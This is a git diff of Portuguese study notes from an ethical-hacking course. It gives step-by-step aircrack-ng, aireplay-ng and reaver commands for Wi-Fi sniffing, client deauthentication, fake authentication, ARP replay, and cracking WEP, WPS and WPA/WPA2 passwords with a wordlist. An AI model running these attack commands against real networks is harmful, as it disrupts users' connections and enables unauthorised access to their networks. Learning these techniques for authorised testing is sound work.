@@ -1,17 +1,58 @@
 
 # [Ethical Hacking](https://www.udemy.com/course/learn-ethical-hacking-from-scratch)
 
-> pacotes necessários
+# Requirements
+
+Aircrack-ng e Reaver
 ```
 sudo apt install net-tools aircrack-ng reaver 
 ```
 
-## change MAC 
+Bettercap
+```
+# Instalando Go
+apt install golang
+
+# Instalando dependencias bettercap 
+sudo apt install build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev 
+
+#Instalando Bettercap
+go get github.com/bettercap/bettercap
+cd $GOPATH/src/github.com/bettercap/bettercap
+make build
+sudo make install
+```
+
+
+## Sumário
+
+- [Change MAC](#change-mac)
+- [Get MAC](#get-mac)
+- [Monitor Mode](#monitor-mode)
+- [Sniffing com Airodump-ng](#sniffing-com-airodump-ng)
+- Attacks
+    - [Deauthentication Attack](#deauthentication-attack)
+    - [Fake Authentication Attack](#fake-authentication-attack)
+    - [ARP Request Replay Attack](#arp-request-replay-attack)
+- Wi-Fi
+    - [WEP cracking](#wi-fi-wep-cracking)
+    - [WPS cracking](#wi-fi-wps-cracking)
+    - [WPA/WPA2 cracking](#wi-fi-wpawpa2-cracking)
+- [Bettercap](#arp-spoofing)
+#
+
+## Change MAC 
 
 ```
 ifconfig wlan1 down
-ifconfig wlan1 hw ether 00:11:22:33:44:55
+ifconfig wlan1 hw ether A0:B1:C2:D3:E4:F5
 ifconfig wlan1 up
+```
+
+## Get MAC
+
+```
+ifconfig -a wlan1 | grep ether
 ```
 
 #
@@ -25,7 +66,9 @@ ifconfig wlan1 up
 ```
 #
 
-## Sniffing (Airodump-ng)
+## Sniffing com Airodump-ng
+
+Utilizado para sniffar redes wi-fis
 
 |||
 |-|-|
@@ -45,48 +88,131 @@ ifconfig wlan1 up
 
 ### Todas as Redes
 ```
-# interface de rede wifi precisa estar em modo monitor
 airodump-ng wlan1
 ```
 
 ### Rede espefífica
 ```
-# interface de rede wifi precisa estar em modo monitor
+airodump-ng --channel [canal] --bssid [mac] wlan1
+```
+
+### Salvar dados
+```
 airodump-ng --channel [canal] --bssid [mac] --write [output file] wlan1
 ```
+
 #
 
 ## Deauthentication Attack
 
 Desautentica um cliente de uma dada rede, sem precisar estar conectado na mesma
 
-1. Listar redes e escolher alvo
-```
-airodump-ng wlan1
-```
+1. [Listar Wi-Fis e escolher alvo](#todas-as-redes)
 
-2. [Sniffar o alvo](#rede-espefífica). Escolha o client alvo. **Deixe o terminal aberto**
-```
-airodump-ng --channel 1 --bssid 00:11:22:33:44:55 wlan1
-```
+2. [Sniffar o Wi-Fi alvo](#rede-espefífica). Deixe este terminal aberto
 
-3. Realizar deauth
-```
-aireplay-ng --deauth 10000000 -a [bssid rede] -c [mac client] wlan1
-```
+3. Executar ataque
+    ```
+    aireplay-ng --deauth 10000000 -a [bssid wi-fi] -c [mac client] wlan1
+    ```
 #
 
 ## Fake Authentication Attack
 
-Gera pacotes de autenticação falsos a uma dada rede, para aumentar o número de pacotes trafegados. Utilizado em ataques como o [WEP cracking](#wep-cracking).
+Se associa a um Wi-Fi, enviando pacotes de autenticação falsos, para aumentar o número de pacotes tráfegados. Utilizado em ataque como [WEP cracking](#wep-cracking).
 
+1. [Listar Wi-Fis e escolher alvo](#todas-as-redes)
 
-### TO-DO
+2. [Sniffar o Wi-Fi alvo e salvar dados de leitura](#salvar-dados). Deixe este terminal aberto
+
+3. Abra outro terminal e execute o ataque
+    -  **num attempts**: número de vezes que o ataque será executado
+    - **mac wifi adapter**: mac da interface em modo monitor
+    ```
+    aireplay-ng --fakeauth [num attempts] -a [bssid wi-fi] -h [mac wifi adapter] wlan1
+    ```
 
 #
 
-## WEP cracking
+## ARP Request Replay Attack 
 
-### TO-DO
+Gera vários pacotes de ARP Request, utilizados para associar um IP a um dado MAC. Utilizado em ataques como [Wi-Fi WEP cracking](#wi-fi-wep-cracking), para forçar a criação de novos IVs. 
+
+1. Associe-se ao wifi alvo, por meio do [Fake Auth Attack](#fake-authentication-attack)
+
+3. Abra outro terminal e execute o ataque 
+    - **mac wifi adapter**: mac da interface em modo monitor
+    ```
+    aireplay-ng --arpreplay -b [bssid wi-fi] -h [mac wifi adapter] wlan1
+    ```
 
 #
+
+## Wi-Fi WEP cracking
+
+Utiliza os IVs trafegados nos pacotes da rede Wi-Fi, para tentar descobrir sua senha. 
+
+1. [Listar Wi-Fis e escolher alvo](#todas-as-redes)
+
+2. [Sniffar o Wi-Fi alvo e salvar dados de leitura](#salvar-dados). Deixe este terminal aberto.
+
+3. **[Situacional]** Se o número de pacotes trafegados for baixo, execute o [ARP Request Replay Attack](#arp-request-replay-attack) antes do comando abaixo
+
+3. Abra outro terminal e execute o ataque. O  sniffing_file.cap é a captura gerada no passo 2 ou 3
+    ```
+    aircrack-ng sniffing_file.cap
+    ```
+#
+
+## Wi-Fi WPS cracking
+
+1. Verificar se alvo tem wps habilitado
+    ```
+    wash --interface wlan1
+    ```
+
+2. Executar Fake Auth com multiplas tentativas
+    ```
+    aireplay-ng --fakeauth 100 -a [bssid wi-fi] -h [mac wifi adapter] wlan1
+    ```
+3. Abra outro Terminal e execute o ataque
+    ```
+    reaver -vvv --no-associate --bssid [bssid wi-fi] --channel [channel wi-fi] --interface wlan1
+    ```
+#
+
+## Wi-Fi WPA/WPA2 cracking
+
+Captura o Handshake de um client com o Wi-Fi e exploita essa informação para tentar quebrar a senha a partir de uma lista de senhas (Método força bruta).
+
+1. [Listar Wi-Fis e escolher alvo](#todas-as-redes)
+
+2. [Sniffar o Wi-Fi alvo e salvar dados de leitura](#salvar-dados). Deixe este terminal aberto.
+
+3. Num novo terminal, desautentique um client deste wi-fi, forçando-o a criar um novo handshake
+    ```
+    aireplay-ng --deauth 4 -a [bssid wi-fi] -c [mac client] wlan1
+    ```
+4. Interromper sniffing do passo 2 quando o handshake for capturado
+
+5. Executar ataque 
+    > [senhas rockyou.txt](https://www.scrapmaker.com/data/wordlists/dictionaries/rockyou.txt)
+
+    > wordlist.txt é a lista de senhas
+
+    ```
+    aircrack-ng sniffing_file.cap -w wordlist.txt
+    ```
+
+#
+
+# Bettercap
+
+## ARP Spoofing
+
+TODO
+
+
+
+
+
